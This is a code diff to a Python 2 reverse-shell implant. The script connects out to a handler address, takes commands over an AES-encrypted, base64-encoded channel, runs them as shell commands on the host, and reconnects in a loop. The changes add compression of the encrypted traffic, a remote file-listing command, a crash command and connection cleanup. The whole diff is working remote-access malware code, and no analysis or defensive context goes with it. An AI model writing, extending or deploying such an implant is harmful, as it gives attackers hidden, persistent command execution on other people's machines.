@@ -1,5 +1,5 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob
 from Crypto.Cipher import AES
 
 def windows_only(func):
@@ -38,10 +38,16 @@ class Shell:
 		return key, IV
 		
 	def encrypt(self, data):
-		return base64.b64encode(self.aes_obj.encrypt(data))
+		return base64.b64encode(self.compress(self.aes_obj.encrypt(data)))
 		
 	def decrypt(self, data):
-		return self.aes_obj.decrypt(base64.b64decode(data))
+		return self.aes_obj.decrypt(self.decompress(base64.b64decode(data)))
+		
+	def compress(self, data):
+		return zlib.compress(data, 9)
+		
+	def decompress(self, data):
+		return zlib.decompress(data)
 
 	def connect(self):
 		self.comm_socket.connect((self.handler_ip, self.handler_port))
@@ -115,6 +121,9 @@ class Shell:
 			return ""
 		except Exception as e:
 			return str(e)
+			
+	def tab_complete(self, text):
+		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
 		
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -132,6 +141,11 @@ class Shell:
 				output = self.set_package_items(arguments)
 		elif command == "cd":
 			output = self.change_directory(arguments)
+		elif command == "LIST_FILES":
+			if not arguments: arguments = ""
+			output = self.tab_complete(arguments)
+		elif command == "crash":
+			raise Exception("As you wish")
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
@@ -141,7 +155,7 @@ class Shell:
 	def run(self):
 		while True:
 			data = self.get_data()
-			print data
+			if not data.startswith("LIST_FILES"): print data
 			output = self.handle_command(data)
 			self.send_data(output)
 			
@@ -152,5 +166,6 @@ while True:
 		shell.run()
 	except Exception as e:
 		print e
+		shell.comm_socket.close()
 		time.sleep(10)
 		continue
